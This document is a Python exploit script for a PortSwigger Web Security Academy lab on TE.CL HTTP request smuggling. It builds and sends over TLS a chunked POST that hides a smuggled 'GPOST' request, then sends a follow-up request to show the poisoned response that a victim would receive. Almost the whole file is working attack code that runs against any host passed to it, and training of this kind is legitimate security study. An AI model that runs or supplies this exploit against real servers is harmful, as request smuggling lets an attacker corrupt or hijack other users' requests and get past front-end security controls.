# P https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
import socket
import sys
import ssl
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').replace('https://','')

context = ssl.create_default_context()

# Null chunk that ends the Transfer-Encoding: chunked part of request
null_chunk = '''\r\n0\r\n\r\n'''

# Smuggled chunk that appears as a second request to backend due
#   to Content-Length: 4 being parsed as the first request.  Need the
#   length of it to include in the Transfer-Encoding: part
smuggle_chunk = f'''GPOST / HTTP/1.1\r\n\
Content-Type: application/x-www-form-urlencoded\r\n\
Content-Length: 15\r\n\
\r\n\
x=1'''
smuggle_chunk_len = hex(len(smuggle_chunk)).lstrip('0x')

# Main request to vulnerable site.  For Transfer-Encoding front-end
#   there is one POST request whose data is encoded with two chunks.
#   For Content-Length backend, there are 2 requests (POST and 
#   smuggled GPOST)
gpost_data = f'''POST / HTTP/1.1\r\n\
Host: {site}\r\n\
Content-Length: 4\r\n\
Transfer-Encoding: chunked\r\n\
\r\n{smuggle_chunk_len}\r\n{smuggle_chunk}{null_chunk}'''

print(f'Attack payload is: \n{gpost_data}')
print('\nSending attack and getting back initial response: ')

# First request to create the confusion
with socket.create_connection((site, 443)) as sock:
    with context.wrap_socket(sock, server_hostname=site) as ssock:
        print(ssock.version())
        ssock.send(gpost_data.encode())
        response = ssock.recv(4096)
        http_response = repr(response)
        print(http_response)

# Next requests gets remnants of the smuggled one, resulting in the GPOST
print(f'\nVictim now visits the  https://{site} and gets result from smuggled request instead of its own: ')
s = requests.Session()
resp = s.post(f'https://{site}')
print(resp.text)
